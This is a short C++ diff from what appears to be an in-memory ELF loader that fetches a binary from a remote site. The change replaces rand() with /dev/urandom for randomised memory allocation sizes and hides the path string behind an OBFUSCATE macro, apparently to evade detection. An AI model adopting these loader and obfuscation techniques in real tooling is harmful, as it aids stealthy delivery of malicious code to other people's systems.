@@ -18,6 +18,7 @@
 #include <vector>
 #include <sys/stat.h>
 #include <unistd.h>
+#include <fcntl.h>
 #include <iostream>
 #include <string>
 #include <cstdlib>
@@ -107,12 +108,16 @@ bool get_file(const char *site, std::vector<char> &elf_data) {
 }
 
 size_t get_random_mem_size(size_t base_size) {
-    srand(time(NULL));
     size_t page_size = sysconf(_SC_PAGESIZE);
-    size_t random_increment = (rand() % ((1024 * 1024 - 10 * 1024) + 1) + 10 * 1024);
-    size_t new_size = base_size + random_increment;  
-    new_size = (new_size + page_size - 1) & ~(page_size - 1);
-    return new_size;
+    size_t random_increment = 0;
+    int fd = open(OBFUSCATE("/dev/urandom"), O_RDONLY);
+    if (fd >= 0) {
+        read(fd, &random_increment, sizeof(random_increment));
+        close(fd);
+    }
+    random_increment = (random_increment % ((1024 * 1024 - 10 * 1024) + 1)) + 10 * 1024;
+    size_t new_size = base_size + random_increment;
+    return (new_size + page_size - 1) & ~(page_size - 1);
 }
 
 char *symtab = NULL, *strtab = NULL;
